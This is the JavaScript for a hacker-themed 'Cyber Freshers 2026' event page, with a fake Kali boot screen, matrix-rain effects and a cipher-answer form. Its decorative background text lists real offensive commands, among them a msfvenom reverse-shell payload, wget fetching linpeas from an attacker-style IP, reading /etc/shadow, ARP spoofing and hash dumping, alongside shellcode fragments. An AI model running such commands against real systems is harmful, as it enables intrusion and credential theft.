/* ═══════════════════════════════════════════════
   CYBER FRESHERS 2026 — HACKER OPS TERMINAL
   Boot sequence, matrix rain, typewriter, form
   ═══════════════════════════════════════════════ */

(function () {
  'use strict';

  // ─── Boot Sequence ──────────────────────────────
  const BOOT_LINES = [
    { text: 'GNU GRUB  version 2.12-1', delay: 200 },
    { text: 'Loading Linux 6.11.2-amd64 ...', delay: 300 },
    { text: 'Loading initial ramdisk ...', delay: 250 },
    { text: '', delay: 100 },
    { text: '[    0.000000] Linux version 6.11.2-amd64 (kali@kali-dev)', delay: 80 },
    { text: '[    0.004521] Command line: BOOT_IMAGE=/boot/vmlinuz-6.11.2-amd64 root=/dev/sda1', delay: 60 },
    { text: '[    0.217834] ACPI: Core revision 20240827', delay: 50 },
    { text: '[    0.982617] PCI: Using configuration type 1 for base access', delay: 40 },
    { text: '', delay: 80 },
    { text: '         ,.........                                              ', type: 'kali-art', delay: 30 },
    { text: '     ,....\':::::::::\',...                 Kali GNU/Linux Rolling   ', type: 'kali-art', delay: 30 },
    { text: '   ..,\':::::::::::::::::,.              ─────────────────────── ', type: 'kali-art', delay: 30 },
    { text: '  .., \'::::::::::::::::::::,                                     ', type: 'kali-art', delay: 30 },
    { text: ' ..,,  \':::::::::::::::::::::,.                                  ', type: 'kali-art', delay: 30 },
    { text: '', delay: 60 },
    { text: '[  OK  ] Created slice Slice /system/modprobe.', status: 'OK', delay: 60 },
    { text: '[  OK  ] Started Journal Service.', status: 'OK', delay: 70 },
    { text: '[  OK  ] Started udev Kernel Device Manager.', status: 'OK', delay: 80 },
    { text: '[  OK  ] Reached target Local File Systems.', status: 'OK', delay: 50 },
    { text: '[  OK  ] Started Network Manager.', status: 'OK', delay: 90 },
    { text: '[  OK  ] Started OpenBSD Secure Shell server.', status: 'OK', delay: 70 },
    { text: '[  OK  ] Reached target Network.', status: 'OK', delay: 50 },
    { text: '[  OK  ] Started PostgreSQL RDBMS.', status: 'OK', delay: 80 },
    { text: '[  OK  ] Started Metasploit Framework Database.', status: 'OK', delay: 100 },
    { text: '[  OK  ] Started Apache2 HTTP Server.', status: 'OK', delay: 70 },
    { text: '[ WARN ] Unauthorized connection attempt detected on eth0.', type: 'warn', delay: 250 },
    { text: '[ FAIL ] Intrusion detected — source: UNKNOWN.', type: 'alert', delay: 200 },
    { text: '[  OK  ] Started Intrusion Detection System.', status: 'OK', delay: 100 },
    { text: '[  OK  ] Reached target Multi-User System.', status: 'OK', delay: 60 },
    { text: '', delay: 100 },
    { text: 'kali login: root (automatic login)', delay: 150 },
    { text: '', delay: 80 },
    { text: '┌──(root㉿kali)-[~]', delay: 100 },
    { text: '└─# ./cyber-freshers-2026.sh', type: 'success', delay: 400 },
  ];

  function runBootSequence() {
    const overlay = document.getElementById('boot-overlay');
    const container = document.getElementById('boot-lines');
    const progressBar = document.getElementById('boot-progress-bar');

    if (!overlay || !container) {
      // No boot overlay — just show main content
      showMainContent();
      return;
    }

    let lineIndex = 0;
    const totalLines = BOOT_LINES.length;

    function addLine() {
      if (lineIndex >= totalLines) {
        // Boot complete — fade out overlay, show intrusion screen
        setTimeout(() => {
          overlay.classList.add('fade-out');
          showIntrusionScreen();
        }, 600);
        return;
      }

      const lineData = BOOT_LINES[lineIndex];
      const lineEl = document.createElement('div');
      lineEl.classList.add('boot-line');
      lineEl.style.animationDelay = '0s';

      let html = '';
      if (lineData.type === 'warn') {
        html = `<span class="status-warn">${lineData.text}</span>`;
      } else if (lineData.type === 'alert') {
        html = `<span class="status-fail">${lineData.text}</span>`;
      } else if (lineData.type === 'success') {
        html = `<span class="status-ok" style="font-weight:bold;">${lineData.text}</span>`;
      } else if (lineData.type === 'kali-art') {
        html = `<span style="color:#4fc3f7; text-shadow: 0 0 6px rgba(79,195,247,0.3); font-size: 0.65rem;">${lineData.text}</span>`;
      } else if (lineData.status) {
        html = `<span class="status-ok">[  OK  ]</span> ${lineData.text.replace('[  OK  ] ', '')}`;
      } else {
        html = lineData.text;
      }

      lineEl.innerHTML = html;
      container.appendChild(lineEl);

      // Update progress bar
      const progress = ((lineIndex + 1) / totalLines) * 100;
      if (progressBar) {
        progressBar.style.width = progress + '%';
      }

      // Auto-scroll
      container.scrollTop = container.scrollHeight;

      lineIndex++;
      setTimeout(addLine, lineData.delay);
    }

    addLine();
  }

  function showMainContent() {
    const mainContainer = document.getElementById('main-container');
    if (mainContainer) {
      mainContainer.classList.add('visible');
    }
  }

  // ─── Advanced Matrix Rain Background ───────────
  function initMatrixRain() {
    const canvas = document.getElementById('matrix-bg');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    // Heavily number-weighted character set for that classic number-rain look
    const numbers = '0123456789';
    const extras = 'アイウエオカキクケコ<>{}[]=~|/\\ABCDEF█▓▒░';
    // Repeat numbers multiple times so they appear way more often
    const allChars = numbers.repeat(8) + extras;
    const fontSize = 10; // Smaller = WAY more columns
    let columns = Math.floor(canvas.width / fontSize);
    let drops = [];
    let speeds = [];
    let brightness = [];

    function initDrops() {
      columns = Math.floor(canvas.width / fontSize);
      drops = [];
      speeds = [];
      brightness = [];
      for (let i = 0; i < columns; i++) {
        drops.push(Math.random() * canvas.height / fontSize);
        speeds.push(0.3 + Math.random() * 2.0);
        brightness.push(0.03 + Math.random() * 0.1);
      }
    }
    initDrops();
    window.addEventListener('resize', initDrops);

    function draw() {
      // Slightly slower fade for more trail persistence
      ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.font = fontSize + 'px Share Tech Mono, monospace';

      for (let i = 0; i < drops.length; i++) {
        const char = allChars[Math.floor(Math.random() * allChars.length)];

        // More frequent bright "lead" characters
        const isHighlight = Math.random() > 0.96;
        const isSuperBright = Math.random() > 0.995;

        if (isSuperBright) {
          // Rare white-hot characters
          ctx.fillStyle = 'rgba(200, 255, 200, 0.9)';
          ctx.shadowColor = 'rgba(0, 255, 65, 1)';
          ctx.shadowBlur = 15;
        } else if (isHighlight) {
          ctx.fillStyle = `rgba(0, 255, 65, ${0.4 + Math.random() * 0.5})`;
          ctx.shadowColor = 'rgba(0, 255, 65, 0.6)';
          ctx.shadowBlur = 8;
        } else {
          ctx.fillStyle = `rgba(0, 255, 65, ${brightness[i]})`;
          ctx.shadowBlur = 0;
        }

        ctx.fillText(char, i * fontSize, drops[i] * fontSize);
        ctx.shadowBlur = 0;

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.96) {
          drops[i] = 0;
          speeds[i] = 0.3 + Math.random() * 2.0;
          brightness[i] = 0.03 + Math.random() * 0.1;
        }
        drops[i] += speeds[i];
      }
    }

    setInterval(draw, 33); // ~30fps for smoother, faster rain
  }

  // ─── Typewriter Effect ────────────────────────
  function initTypewriter() {
    const el = document.getElementById('typewriter-text');
    if (!el) return;

    const message = 'WELCOME FRESHER YOUR FIRST MISSION BEGINS HERE';
    let index = 0;

    function type() {
      if (index < message.length) {
        el.textContent += message[index];
        index++;

        // Randomize typing speed for realism
        const baseSpeed = 35;
        const variance = Math.random() * 45;
        // Occasional pauses at spaces
        const pause = message[index - 1] === ' ' ? 80 : 0;
        setTimeout(type, baseSpeed + variance + pause);
      } else {
        el.classList.add('done');
      }
    }

    // Start after boot sequence would be done
    setTimeout(type, 400);
  }

  // ─── Fake IP Randomizer ───────────────────────
  function initFakeIP() {
    const ipEl = document.getElementById('fake-ip');
    if (!ipEl) return;

    function randomize() {
      const o3 = Math.floor(Math.random() * 255);
      const o4 = Math.floor(Math.random() * 255);
      ipEl.textContent = `192.168.${o3}.${o4}`;
    }

    // Change IP every few seconds
    randomize();
    setInterval(randomize, 3000);
  }

  // ─── Key Press Visual Indicator ───────────────
  function initKeyIndicator() {
    const indicator = document.getElementById('key-indicator');
    if (!indicator) return;

    const states = [
      'SYS_READY', 'MONITORING...', 'PACKETS_OK',
      'NO_THREAT', 'SCANNING...', 'SECURE',
      'ENCRYPTED', 'SHIELD_UP'
    ];

    let stateIdx = 0;

    document.addEventListener('keydown', () => {
      stateIdx = (stateIdx + 1) % states.length;
      indicator.textContent = states[stateIdx];
      indicator.style.opacity = '0.7';
      setTimeout(() => {
        indicator.style.opacity = '0.4';
      }, 200);
    });
  }

  // ─── Attempt Counter ──────────────────────────
  let attempts = 0;

  function incrementAttempts() {
    attempts++;
    const countEl = document.getElementById('attempt-count');
    if (countEl) {
      countEl.textContent = attempts;
    }
  }

  // ─── Form Submission ──────────────────────────
  function initForm() {
    const form = document.getElementById('cipher-form');
    const input = document.getElementById('cipher-input');
    const submitBtn = document.getElementById('submit-btn');
    const resultArea = document.getElementById('result-area');
    const resultMessage = document.getElementById('result-message');
    const terminalCard = document.querySelector('.terminal-card');

    if (!form) return;

    form.addEventListener('submit', async function (e) {
      e.preventDefault();

      const answer = input.value.trim();
      if (!answer) return;

      incrementAttempts();

      // Show loading state
      const btnText = submitBtn.querySelector('.btn-text');
      const btnLoading = submitBtn.querySelector('.btn-loading');
      btnText.style.display = 'none';
      btnLoading.style.display = 'inline';
      submitBtn.disabled = true;

      // Simulate brief "processing" delay for effect
      await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 600));

      try {
        const res = await fetch('/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ answer: answer })
        });

        const data = await res.json();

        // Show result
        resultArea.style.display = 'block';
        resultArea.className = 'result ' + (data.success ? 'result--success' : 'result--error');

        if (data.success) {
          resultMessage.textContent = '█ ACCESS GRANTED — Identity verified. Redirecting to secure channel...';

          // Flash the screen green
          const flash = document.createElement('div');
          flash.className = 'access-flash';
          document.body.appendChild(flash);
          setTimeout(() => flash.remove(), 1500);

          // Redirect after the cinematic moment
          setTimeout(() => {
            window.location.href = '/success';
          }, 2500);
        } else {
          resultMessage.textContent = '✘ ACCESS DENIED — Cipher mismatch. Intrusion logged. Try again, fresher.';

          // Glitch shake the card on wrong answer
          if (terminalCard) {
            terminalCard.classList.add('glitch-shake');
            setTimeout(() => terminalCard.classList.remove('glitch-shake'), 600);
          }
        }
      } catch (err) {
        resultArea.style.display = 'block';
        resultArea.className = 'result result--error';
        resultMessage.textContent = '✘ CONNECTION LOST — Secure tunnel disrupted. Retry.';
      } finally {
        // Reset button
        btnText.style.display = 'inline';
        btnLoading.style.display = 'none';
        submitBtn.disabled = false;
      }
    });
  }

  // ─── Floating Hacker Background ───────────────
  function initHackerBackground() {
    const container = document.getElementById('hacker-bg');
    if (!container) return;

    // ── Kali Linux basic commands ──
    const kaliCommands = [
      'root@kali:~# nmap -sS -sV -O 192.168.1.0/24',
      'root@kali:~# nmap -A -T4 -p- 10.10.10.1',
      'root@kali:~# nmap --script vuln 192.168.1.105',
      'root@kali:~# airmon-ng start wlan0',
      'root@kali:~# airodump-ng wlan0mon',
      'root@kali:~# aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon',
      'root@kali:~# aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap',
      'root@kali:~# msfconsole',
      'msf6 > search type:exploit platform:linux',
      'msf6 > use exploit/multi/handler',
      'msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp',
      'msf6 > exploit -j',
      'meterpreter > sysinfo',
      'meterpreter > hashdump',
      'meterpreter > shell',
      'root@kali:~# sqlmap -u "http://target/page?id=1" --dbs',
      'root@kali:~# sqlmap --os-shell',
      'root@kali:~# hydra -L users.txt -P pass.txt ssh://192.168.1.105',
      'root@kali:~# john --wordlist=rockyou.txt hashes.txt',
      'root@kali:~# hashcat -m 1000 -a 0 ntlm.txt rockyou.txt',
      'root@kali:~# burpsuite &',
      'root@kali:~# wireshark -i eth0 &',
      'root@kali:~# tcpdump -i eth0 -w packets.pcap',
      'root@kali:~# netdiscover -r 192.168.1.0/24',
      'root@kali:~# arpspoof -i eth0 -t 192.168.1.1 192.168.1.105',
      'root@kali:~# ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.105/',
      'root@kali:~# gobuster dir -u http://target -w /usr/share/dirb/common.txt',
      'root@kali:~# dirb http://192.168.1.105/ /usr/share/wordlists/',
      'root@kali:~# nikto -h http://192.168.1.105',
      'root@kali:~# wpscan --url http://target --enumerate u,p',
      'root@kali:~# enum4linux -a 192.168.1.105',
      'root@kali:~# smbclient -L //192.168.1.105 -N',
      'root@kali:~# crackmapexec smb 192.168.1.0/24',
      'root@kali:~# responder -I eth0 -dwPv',
      'root@kali:~# impacket-secretsdump DOMAIN/admin@192.168.1.105',
      'root@kali:~# searchsploit apache 2.4',
      'root@kali:~# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 -f elf > shell.elf',
      'root@kali:~# nc -lvnp 4444',
      'root@kali:~# python3 -m http.server 8080',
      'root@kali:~# wget http://10.10.14.12:8000/linpeas.sh',
      'root@kali:~# chmod +x linpeas.sh && ./linpeas.sh',
      'root@kali:~# find / -perm -4000 -type f 2>/dev/null',
      'root@kali:~# cat /etc/shadow',
      'root@kali:~# cat /etc/passwd',
      'root@kali:~# sudo -l',
      'root@kali:~# uname -a',
      'root@kali:~# id && whoami',
      'root@kali:~# ifconfig eth0',
      'root@kali:~# route -n',
      'root@kali:~# ss -tulnp',
      'root@kali:~# apt update && apt full-upgrade -y',
      'root@kali:~# apt install kali-linux-large',
      'root@kali:~# setoolkit',
      'root@kali:~# beef-xss',
      'root@kali:~# maltego',
      'root@kali:~# recon-ng',
      'root@kali:~# theharvester -d target.com -b all',
      'root@kali:~# fierce --domain target.com',
      'root@kali:~# whatweb http://target.com',
      'root@kali:~# wafw00f http://target.com',
      'root@kali:~# steghide extract -sf image.jpg',
      'root@kali:~# binwalk -e firmware.bin',
      'root@kali:~# volatility -f memory.dump imageinfo',
      'root@kali:~# autopsy &',
      'root@kali:~# ghidra &',
      'root@kali:~# radare2 ./binary',
      'root@kali:~# gdb -q ./exploit',
      '[*] Meterpreter session 1 opened',
      '[+] Exploit completed successfully',
      '[!] WARNING: Firewall detected',
      '[+] Root shell obtained!',
      '[*] Sending payload...',
      '[+] KEY FOUND! [ ████████████ ]',
    ];

    // ── Machine-understandable language ──
    const machineCode = [
      // Binary strings
      '01001000 01000101 01001100 01001100 01001111',
      '10110010 11010100 00101110 01110011 11001010',
      '01100001 01100011 01100011 01100101 01110011',
      '11111111 00000000 11001100 10101010 01010101',
      '00100000 01001011 01000001 01001100 01001001',
      '01110010 01101111 01101111 01110100 00111010',
      '10000011 11000100 00101000 01001000 10001101',
      '01001000 10001011 00000101 11111111 11111111',
      '11001010 11011110 10110001 00001111 10101011',
      '00110001 00110000 00110001 00110000 00110001',
      // Hex dumps
      '0x0000: 48 65 6C 6C 6F 20 57 6F 72 6C 64 21 0A 00 00 00',
      '0x0010: 7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00',
      '0x0020: 02 00 3E 00 01 00 00 00 78 00 40 00 00 00 00 00',
      '0x0030: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00',
      '0x0040: B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00',
      '0x0050: 89 E5 83 EC 18 83 E4 F0 B8 00 00 00 00 E8 00 00',
      '0x0060: 55 48 89 E5 48 83 EC 10 48 8D 3D 00 00 00 00 E8',
      '0xFF00: DE AD BE EF CA FE BA BE 13 37 C0 DE FA CE D0 0D',
      '0xFF10: 00 00 00 00 FF FF FF FF 48 8B 05 00 00 00 00 FF',
      '0xFF20: CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC',
      // x86 Assembly
      'mov    eax, 0x1',
      'mov    ebx, 0x0',
      'int    0x80',
      'push   rbp',
      'mov    rbp, rsp',
      'sub    rsp, 0x20',
      'lea    rdi, [rip+0x2f]',
      'call   printf@plt',
      'xor    eax, eax',
      'pop    rbp',
      'ret',
      'jmp    0x08048490',
      'cmp    eax, 0xff',
      'jne    0x00401234',
      'syscall',
      'nop',
      'mov    rdi, rax',
      'mov    rsi, [rbp-0x8]',
      'call   0x00401100 <malloc@plt>',
      'test   rax, rax',
      'je     0x00401256',
      // Memory addresses
      '0x00007fff5fbff8c0 → 0x0000000100000f40',
      '0x00007fff5fbff8d0 → 0x00007fff5fbffb00',
      '$rip = 0x0000555555555169 <main+0>',
      '$rsp = 0x00007fffffffddd0',
      '$rbp = 0x00007fffffffddf0',
      'SIGSEGV at 0x41414141',
      'Stack: 0x7fffffffe000',
      'Heap:  0x555555559000',
      // Opcodes
      '\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x89\\xc6\\x48\\x8d\\x3d',
      '\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05',
      '\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02',
      '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69',
      // Raw binary streams
      '110010110100101010001101001010100110100101',
      '001011010100101001010010100101001010010101',
      '101010010100101010010101001010100101010010',
      '010010110100101010001101001010100110100101',
    ];

    function spawnKaliCommand() {
      const el = document.createElement('div');
      el.className = 'hacker-text';

      // Vary styling
      const r = Math.random();
      if (r < 0.3) el.classList.add('bright');
      else if (r < 0.5) el.classList.add('cyan');
      else if (r < 0.6) el.classList.add('red');

      // Pick 1-3 consecutive command lines
      const numLines = 1 + Math.floor(Math.random() * 3);
      const startIdx = Math.floor(Math.random() * kaliCommands.length);
      let text = '';
      for (let i = 0; i < numLines; i++) {
        text += kaliCommands[(startIdx + i) % kaliCommands.length];
        if (i < numLines - 1) text += '\n';
      }
      el.textContent = text;
      el.style.whiteSpace = 'pre';

      // Position
      const isHorizontal = Math.random() > 0.65;
      if (isHorizontal) {
        el.classList.add('horizontal');
        el.style.top = (3 + Math.random() * 90) + 'vh';
      } else {
        el.style.left = (2 + Math.random() * 92) + 'vw';
      }

      el.style.animationDuration = (18 + Math.random() * 35) + 's';
      el.style.fontSize = (0.55 + Math.random() * 0.25) + 'rem';

      container.appendChild(el);
      el.addEventListener('animationend', () => el.remove());
    }

    function spawnMachineCode() {
      const el = document.createElement('div');
      el.className = 'hacker-text machine';

      // Pick 2-6 lines for a dense block of machine code
      const numLines = 2 + Math.floor(Math.random() * 5);
      const startIdx = Math.floor(Math.random() * machineCode.length);
      let text = '';
      for (let i = 0; i < numLines; i++) {
        text += machineCode[(startIdx + i) % machineCode.length];
        if (i < numLines - 1) text += '\n';
      }
      el.textContent = text;
      el.style.whiteSpace = 'pre';

      // Position — machine code goes everywhere
      const isHorizontal = Math.random() > 0.75;
      if (isHorizontal) {
        el.classList.add('horizontal');
        el.style.top = (2 + Math.random() * 92) + 'vh';
      } else {
        el.style.left = (1 + Math.random() * 95) + 'vw';
      }

      el.style.animationDuration = (25 + Math.random() * 45) + 's';

      container.appendChild(el);
      el.addEventListener('animationend', () => el.remove());
    }

    // Spawn initial batch — dense from the start
    for (let i = 0; i < 12; i++) {
      setTimeout(() => spawnKaliCommand(), i * 500);
    }
    for (let i = 0; i < 10; i++) {
      setTimeout(() => spawnMachineCode(), i * 600 + 200);
    }

    // Keep spawning both types
    setInterval(spawnKaliCommand, 1800);
    setInterval(spawnMachineCode, 1400);
  }

  // ─── Intrusion Screen Digital Rain ────────────
  let intrusionRainInterval = null;

  function initIntrusionRain() {
    const canvas = document.getElementById('intrusion-rain');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    // Characters: heavy on 0/1, with hex and cyber symbols mixed in
    const binChars = '01';
    const hexChars = '0123456789ABCDEF';
    const cyberSymbols = '⚡⚠☠✦◆▲►◄█▓▒░{}[]<>/\\|~^';
    const allChars = binChars.repeat(20) + hexChars.repeat(3) + cyberSymbols;

    const fontSize = 12;
    let columns = Math.floor(canvas.width / fontSize);
    let drops = [];
    let speeds = [];
    let alphas = [];
    let sizes = [];

    function initDrops() {
      columns = Math.floor(canvas.width / fontSize);
      drops = [];
      speeds = [];
      alphas = [];
      sizes = [];
      for (let i = 0; i < columns; i++) {
        drops.push(Math.random() * canvas.height / fontSize);
        speeds.push(0.2 + Math.random() * 1.5);
        alphas.push(0.02 + Math.random() * 0.08);
        sizes.push(fontSize - 4 + Math.floor(Math.random() * 6));
      }
    }
    initDrops();
    window.addEventListener('resize', initDrops);

    // Glitch flicker state
    let glitchTimer = 0;
    let isGlitching = false;

    function draw() {
      // Clear transparently so background image stays 100% visible
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      // Occasional glitch flicker
      glitchTimer++;
      if (glitchTimer > 200 + Math.random() * 400) {
        isGlitching = true;
        glitchTimer = 0;
        setTimeout(() => { isGlitching = false; }, 50 + Math.random() * 100);
      }

      if (isGlitching) {
        ctx.fillStyle = 'rgba(255, 34, 68, 0.05)';
        ctx.fillRect(0, Math.random() * canvas.height, canvas.width, 2 + Math.random() * 8);
      }

      for (let i = 0; i < drops.length; i++) {
        const char = allChars[Math.floor(Math.random() * allChars.length)];
        const isBright = Math.random() > 0.95;
        const isRed = (i % 6 === 0);

        ctx.font = sizes[i] + 'px JetBrains Mono, Share Tech Mono, monospace';

        if (isRed) {
          ctx.fillStyle = isBright ? 'rgba(255, 70, 95, 0.85)' : 'rgba(255, 34, 68, 0.4)';
          ctx.shadowColor = 'rgba(255, 34, 68, 0.6)';
          ctx.shadowBlur = isBright ? 8 : 3;
        } else if (isBright) {
          ctx.fillStyle = 'rgba(120, 255, 160, 0.85)';
          ctx.shadowColor = 'rgba(0, 255, 65, 0.6)';
          ctx.shadowBlur = 6;
        } else {
          ctx.fillStyle = `rgba(0, 255, 65, ${alphas[i] * 4})`;
          ctx.shadowBlur = 0;
        }

        ctx.fillText(char, i * fontSize, drops[i] * fontSize);
        ctx.shadowBlur = 0;

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.96) {
          drops[i] = 0;
          speeds[i] = 0.2 + Math.random() * 1.5;
          alphas[i] = 0.02 + Math.random() * 0.08;
        }
        drops[i] += speeds[i];
      }
    }

    intrusionRainInterval = setInterval(draw, 33);
  }

  // ─── Intrusion Hex Fragments ──────────────────
  function spawnHexFragments() {
    const overlay = document.getElementById('intrusion-overlay');
    if (!overlay) return;

    const hexStrings = [
      '0xDEADBEEF', '0xCAFEBABE', '0x1337C0DE', '0xFF00FF',
      '0xBAADF00D', '0x8BADF00D', '0xFEEDFACE', '0xC0FFEE',
      '0x0B00B135', 'SYN_FLOOD', 'ACK_STORM', 'TCP_RST',
      'PAYLOAD_RDY', 'SHELL_SPAWN', 'ROOT_ACCESS', 'PRIV_ESC',
      'BUFFER_OVFL', 'HEAP_SPRAY', 'ROP_CHAIN', 'NOP_SLED'
    ];

    function spawn() {
      const el = document.createElement('div');
      el.className = 'intrusion-hex-fragment';
      el.textContent = hexStrings[Math.floor(Math.random() * hexStrings.length)];
      el.style.left = (5 + Math.random() * 90) + '%';
      el.style.animationDuration = (8 + Math.random() * 16) + 's';
      el.style.fontSize = (0.5 + Math.random() * 0.3) + 'rem';
      el.style.opacity = 0.03 + Math.random() * 0.05;
      overlay.appendChild(el);
      el.addEventListener('animationend', () => el.remove());
    }

    // Initial batch
    for (let i = 0; i < 8; i++) {
      setTimeout(spawn, i * 400);
    }
    // Ongoing
    const hexInterval = setInterval(spawn, 2000);

    // Store interval for cleanup
    overlay._hexInterval = hexInterval;
  }

  // ─── Intrusion Typewriter ─────────────────────
  function intrusionTypewriter(elementId, text, speed, callback) {
    const el = document.getElementById(elementId);
    if (!el) { if (callback) callback(); return; }

    el.classList.add('typing');
    let index = 0;

    function type() {
      if (index < text.length) {
        el.textContent += text[index];
        index++;
        const variance = Math.random() * (speed * 0.6);
        setTimeout(type, speed + variance);
      } else {
        el.classList.remove('typing');
        el.classList.add('done');
        if (callback) callback();
      }
    }

    type();
  }

  // ─── Show Intrusion Screen ────────────────────
  function showIntrusionScreen() {
    const overlay = document.getElementById('intrusion-overlay');
    if (!overlay) {
      showMainContent();
      return;
    }

    // Start digital rain
    initIntrusionRain();
    spawnHexFragments();

    // Fade in the overlay
    overlay.classList.add('active');

    // Animation timeline
    const bgImage = document.getElementById('intrusion-bg-image');
    const hacker = document.getElementById('intrusion-hacker');
    const beginBtn = document.getElementById('intrusion-begin-btn');
    const line3 = document.getElementById('intrusion-line-3');

    // 1. Background image fades in with slow zoom at 500ms
    setTimeout(() => {
      if (bgImage) bgImage.classList.add('visible');
    }, 500);

    // 2. Hacker silhouette fades in behind at 1500ms
    setTimeout(() => {
      if (hacker) hacker.classList.add('visible');
    }, 1500);

    // 3. Text lines type one by one starting at 2200ms
    setTimeout(() => {
      intrusionTypewriter('intrusion-line-1', '\u26A0\uFE0F Greetings Indruder \u26A0\uFE0F', 55, () => {
        // Line 2 starts after line 1
        setTimeout(() => {
          intrusionTypewriter('intrusion-line-2', 'You crawled inside. \uD83E\uDE78 Let\'s see if you ever crawl out.', 45, () => {
            // Line 3 — final line with glitch
            setTimeout(() => {
              intrusionTypewriter('intrusion-line-3', 'Begin... if you have some balls.', 50, () => {
                // Trigger glitch on final line
                if (line3) {
                  line3.classList.add('glitch-active');
                  setTimeout(() => line3.classList.remove('glitch-active'), 600);
                }

                // Show BEGIN button after glitch
                setTimeout(() => {
                  if (beginBtn) beginBtn.classList.add('visible');
                }, 800);
              });
            }, 400);
          });
        }, 500);
      });
    }, 2200);

    // BEGIN button click handler
    if (beginBtn) {
      beginBtn.addEventListener('click', function () {
        // Fade out intrusion overlay
        overlay.classList.remove('active');
        overlay.classList.add('fade-out');

        // Clean up intrusion rain
        if (intrusionRainInterval) {
          clearInterval(intrusionRainInterval);
          intrusionRainInterval = null;
        }
        if (overlay._hexInterval) {
          clearInterval(overlay._hexInterval);
        }

        // Mark intrusion as done
        sessionStorage.setItem('cyber_intrusion_done', '1');

        // Show main content after fade
        setTimeout(() => {
          overlay.style.display = 'none';
          showMainContent();
          initTypewriter();
        }, 1000);
      });
    }
  }

  // ─── Initialize ───────────────────────────────
  document.addEventListener('DOMContentLoaded', function () {
    initMatrixRain();
    initHackerBackground();

    const hasBooted = sessionStorage.getItem('cyber_booted');
    const intrusionDone = sessionStorage.getItem('cyber_intrusion_done');

    if (!hasBooted) {
      // First visit: boot → intrusion → main
      runBootSequence();
      sessionStorage.setItem('cyber_booted', '1');
    } else if (!intrusionDone) {
      // Booted before but intrusion not dismissed: show intrusion
      const bootOverlay = document.getElementById('boot-overlay');
      if (bootOverlay) bootOverlay.style.display = 'none';
      showIntrusionScreen();
    } else {
      // Both done: skip straight to main content
      const bootOverlay = document.getElementById('boot-overlay');
      if (bootOverlay) bootOverlay.style.display = 'none';
      const intrusionOverlay = document.getElementById('intrusion-overlay');
      if (intrusionOverlay) intrusionOverlay.style.display = 'none';
      showMainContent();
      initTypewriter();
    }

    initForm();
    initFakeIP();
    initKeyIndicator();
  });
})();
